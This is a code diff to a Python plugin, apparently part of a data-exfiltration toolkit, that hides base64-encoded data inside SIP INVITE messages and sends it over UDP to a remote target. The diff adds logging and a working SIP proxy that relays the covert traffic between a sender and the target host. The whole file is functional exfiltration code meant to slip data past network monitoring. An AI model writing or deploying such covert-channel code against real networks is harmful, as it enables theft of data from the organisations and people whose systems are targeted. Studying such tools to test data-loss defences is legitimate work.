@@ -8,6 +8,7 @@ import string
 import random
 import base64
 import re
+from random import choice
 import traceback
 
 config = None
@@ -178,6 +179,7 @@ class SIPDialog:
         return packet
 
 def listen():
+    app_exfiltrate.log_message('info', "[sip] Listening for incoming calls")
     port = config['port']
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     sock.bind(('', port))
@@ -202,6 +204,7 @@ def listen():
                     [boundary] = re.findall(parser, req.headers['content-type'])
                     #Hackish payload isolation
                     payload = req.body.split('--'+boundary)[-2].split('\r\n')[-2]
+                    app_exfiltrate.log_message('info', "[sip] Received {0} bytes from {1}".format(len(payload), addr[0]))
                     app_exfiltrate.retrieve_data(base64.b64decode(payload))
         except Exception as e:
             print traceback.format_exc()
@@ -222,6 +225,7 @@ def send(data):
     uac = UserAgent(caller, laddr, port=port)
     uas = UserAgent(callee, target, port=port)
     invite = dialog.invite(uac, uas, data)
+    app_exfiltrate.log_message('info', "[sip] Sending {0} bytes to {1}".format(len(data), target))
     sock.sendto(invite.pack(), (target, port))
     while True:
         try:
@@ -240,7 +244,25 @@ def send(data):
         break
 
 def proxy():
-    pass
+    app_exfiltrate.log_message('info', "[proxy] [sip] Starting SIP proxy")
+    target = config['target']
+    port = config['port']
+    sender = ""
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.bind(('', port))
+    while True:
+        data, addr = sock.recvfrom(65535)
+        if addr[0] != target:
+            sender = addr[0]
+        try:
+            if addr[0] == target:
+                app_exfiltrate.log_message('info', "[proxy] [sip] Relaying data to {0}".format(target))
+                sock.sendto(data, (sender, port))
+            else:
+                app_exfiltrate.log_message('info', "[proxy] [sip] Relaying data to {0}".format(sender))
+                sock.sendto(data, (target, port))
+        except:
+            print traceback.format_exc()
 
 class Plugin:
 
